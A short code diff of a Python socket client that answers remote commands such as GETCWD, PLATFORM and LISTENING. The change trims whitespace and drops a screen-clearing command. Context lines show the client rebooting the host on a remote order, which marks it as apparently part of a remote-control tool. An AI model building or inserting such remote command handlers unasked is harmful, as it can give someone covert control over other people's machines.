@@ -334,11 +334,11 @@ class Client(object):
             if data[0] == 'GETCWD':
                 self.send(os.getcwdb())
                 continue
-            
+
             if data[0] == 'LIST':
                 self.socket.send(b' ')
                 continue
-            
+
             if data[0] == 'PLATFORM':
                 self.send(platform.system().encode())
                 continue
@@ -396,14 +396,6 @@ class Client(object):
                     subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
-
-            if data[0] == 'CLEAR':
-                if platform.system() == 'Windows':
-                    os.system('cls')
-                else:
-                    os.system('clear')
-                self.send(b'DONE')
-                continue
 
             if data[0] == 'LISTENING':
                 self.send(b'DONE')
